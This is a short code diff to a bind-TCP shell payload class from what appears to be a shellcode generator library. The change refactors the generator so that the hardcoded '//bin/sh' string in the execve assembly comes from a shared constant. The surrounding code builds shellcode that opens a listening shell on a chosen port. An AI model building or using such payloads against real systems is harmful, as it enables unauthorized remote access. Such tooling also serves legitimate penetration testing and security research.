@@ -26,8 +26,10 @@
 
 from hatvenom import HatVenom
 
+from hatloads.consts import Consts
 
-class ShellBindTCP(HatVenom):
+
+class ShellBindTCP(HatVenom, Consts):
     def generate(self, assemble=True, options={}):
         if 'BPORT' not in options:
             return b''
@@ -85,7 +87,7 @@ class ShellBindTCP(HatVenom):
 
             xor rsi, rsi
             push rsi
-            mov rdi, 0x68732f6e69622f2f
+            mov rdi, 0x{self.shell.hex()}
             push rdi
             mov rdi, rsp
             xor rdx, rdx
